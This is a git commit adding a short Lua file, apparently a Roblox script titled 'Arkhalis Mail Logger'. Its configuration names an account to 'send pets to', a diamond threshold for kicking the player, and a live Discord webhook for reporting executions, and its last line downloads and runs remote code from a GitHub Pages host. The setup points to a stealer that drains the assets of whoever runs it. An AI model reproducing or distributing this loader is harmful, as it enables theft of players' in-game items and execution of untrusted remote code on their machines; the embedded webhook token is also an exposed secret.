c77436195dcc8d98d4b715aa8adb083b6cdc9c86
HosteeScriptz <saifelabd2021@gmail.com>
2023-05-23 15:38:24 +0300

    Create code.lua

---
+++ code.lua
@@ -0,0 +1,11 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username = "HosteeScriptz" --// Username To Send Pets To
+_G.Diamonds = 0 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1109384852635123773/1xcQ48Bv1wGjbN-JS2DjvtZiQOe-IUQgysFp38ir_M7ehwLIT-O8tO3wgOj-gJrsH9WD" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
